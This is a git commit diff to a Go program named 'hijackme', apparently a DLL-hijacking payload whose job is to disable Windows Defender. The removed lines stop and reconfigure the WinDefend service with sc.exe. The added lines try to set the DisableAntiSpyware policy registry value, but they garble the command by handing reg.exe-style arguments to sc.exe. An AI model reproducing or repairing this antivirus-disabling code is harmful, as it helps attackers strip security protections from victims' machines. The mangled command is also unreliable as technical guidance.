36c192f8b99e27ac67424bc9b77da73e9d3a9abc
arnoudx6 <arnoud.stolk@ziggo.nl>
2022-11-07 20:37:47 +0100

    aaa

--- hijackme/hijackme.go
+++ hijackme/hijackme.go
@@ -14,26 +14,14 @@ func Entry() {
 
 //export main
 func main() {
-	//First stop service
+	//Create a key to stop the service
 	println("Stopping the service")
-	cmd1 := exec.Command("sc.exe", "stop", "WinDefend")
+	cmd1 := exec.Command("sc.exe",
+		"add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v DisableAntiSpyware", "/t REG_DWORD", "/d 1", "/f")
 	err1 := cmd1.Run()
 
 	if err1 != nil {
 		log.Fatal(err1)
-	}
-
-	//Wait for the service to stop
-	time.Sleep(5 * time.Second)
-
-	println("disabling the service")
-
-	//Now disabling the service
-	cmd2 := exec.Command("sc.exe", "config", "WinDefend", "start=", "auto")
-	err2 := cmd2.Run()
-
-	if err2 != nil {
-		log.Fatal(err2)
 	}
 
 	//Final sleep for debugging purpose
